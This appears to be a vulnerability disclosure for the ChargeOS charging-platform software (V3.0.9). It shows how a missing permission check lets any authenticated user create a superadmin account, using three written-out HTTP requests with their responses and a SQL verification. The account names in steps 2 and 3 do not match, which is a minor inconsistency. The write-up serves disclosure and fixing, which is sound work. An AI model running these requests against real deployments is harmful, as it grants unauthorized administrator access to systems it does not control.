# ChargeOS (慧智充电) — Vertical privilege escalation: any authenticated user can create an administrator

## Introduction

The business microservices of ChargeOS (hcp-system / hcp-operator / hcp-mp / hcp-file / hcp-job) expose **50 controllers with zero `@PreAuthorize`** method-level checks — authorization relies only on the gateway token check plus `HeaderInterceptor` trust of the `user_id/username/tenant-id` request headers（HeaderInterceptor.java:35-39). `SysUserController.add`（SysUserController.java:211-212, `@PostMapping public AjaxResult add(@Validated @RequestBody SysUser user)`）has **no permission annotation**, so any authenticated user — including a plain role-2 user — can `POST /system/user` with `roleIds:[1]` (superadmin role) and create an administrator account, then log in with it. Verified live on a full local stack (Nacos + MySQL + Redis + auth/system/operator/gateway).

## Affected versions

HUIZHI-ChargeOS cloud V3.0.9

## Utilize conditions

- Any authenticated account (including a low-privilege role-2 user); no admin rights needed
- Gateway enforces token (`Authorization: Bearer <token>`); captcha can be disabled or solved normally

---

## Vulnerability Reproduction

**Step 1** — log in as a plain (role 2) user:

```http
POST /auth/login HTTP/1.1
Host: <gateway:38080>
Content-Type: application/json

{"username":"cs001","password":"admin123","code":"","uuid":""}
```

Response :

![image-20260825114647801](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825114647801.5xbdf58ari.webp)

```json
{"code":200,"msg":null,"data":{"access_token":"eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyX2lkIjoxMDU...","tenant_id":9999,"expires_in":720}}
```

**Step 2** — the plain user creates an account bound to role 1 (superadmin):

```http
POST /system/user HTTP/1.1
Host: <gateway:38080>
Content-Type: application/json
Authorization: Bearer <cs001-token>

{"userName":"hacker10","nickName":"hacker10","password":"Hack@123","deptId":103,"roleIds":[1],"phonenumber":"13800138002","status":"0"}
```

Response :

![image-20260825114749404](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825114749404.9rk4y3qo5x.webp)

```json
{"msg":"操作成功","code":200}
```

**Step 3** — log in as the created superadmin:

```http
POST /auth/login HTTP/1.1
Host: <gateway:38080>
Content-Type: application/json

{"username":"hacker9","password":"Hack@123","code":"","uuid":""}
```

Response — access_token with `user_id:109` issued:

![image-20260825114840447](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825114840447.mt84si3w.webp)

```json
{"code":200,"data":{"access_token":"eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyX2lkIjoxMDk...","tenant_id":9999,"expires_in":720}}
```

DB verification — `hacker10` bound to `role_id=1` (超级管理员):

```sql
SELECT u.user_id,u.user_name,r.role_id,r.role_name FROM sys_user u
  LEFT JOIN sys_user_role ur ON u.user_id=ur.user_id
  LEFT JOIN sys_role r ON ur.role_id=r.role_id WHERE u.user_name='hacker10';
-- 109 | hacker10 | 1 | 超级管理员
```

SysUserController.java:211-212（@PostMapping public AjaxResult add(...) 无 @PreAuthorize）

![image-20260825115108926](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825115108926.7w7k5hetwp.webp)



HeaderInterceptor.java:35-39![image-20260825115217028](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825115217028.1hsy9vxax8.webp)
